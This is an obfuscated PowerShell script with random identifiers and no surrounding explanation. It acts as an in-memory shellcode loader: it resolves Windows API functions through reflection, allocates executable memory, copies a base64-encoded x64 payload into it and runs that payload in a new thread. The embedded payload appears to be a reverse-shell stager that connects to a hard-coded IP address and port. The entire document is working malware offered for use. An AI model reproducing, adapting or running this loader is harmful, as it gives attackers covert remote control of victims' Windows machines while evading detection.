function jLgFldbtDPOm {
	Param ($afpS1mv0, $tOB)		
	$cOBPYpcOb = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $cOBPYpcOb.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($cOBPYpcOb.GetMethod('GetModuleHandle')).Invoke($null, @($afpS1mv0)))), $tOB))
}

function o7wdSH0Uztfn {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $izZLYOAwkRAm,
		[Parameter(Position = 1)] [Type] $hHOcq91KVx5 = [Void]
	)
	
	$itZM6N1bd = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$itZM6N1bd.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $izZLYOAwkRAm).SetImplementationFlags('Runtime, Managed')
	$itZM6N1bd.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $hHOcq91KVx5, $izZLYOAwkRAm).SetImplementationFlags('Runtime, Managed')
	
	return $itZM6N1bd.CreateType()
}

[Byte[]]$trIi9A9tPq7i = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFdwKgBlUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoFQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZu+AdKgpBidr/1Q==")
		
$lgHN = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((jLgFldbtDPOm kernel32.dll VirtualAlloc), (o7wdSH0Uztfn @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $trIi9A9tPq7i.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($trIi9A9tPq7i, 0, $lgHN, $trIi9A9tPq7i.length)

$zDfdn4Z = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((jLgFldbtDPOm kernel32.dll CreateThread), (o7wdSH0Uztfn @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lgHN,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((jLgFldbtDPOm kernel32.dll WaitForSingleObject), (o7wdSH0Uztfn @([IntPtr], [Int32]))).Invoke($zDfdn4Z,0xffffffff) | Out-Null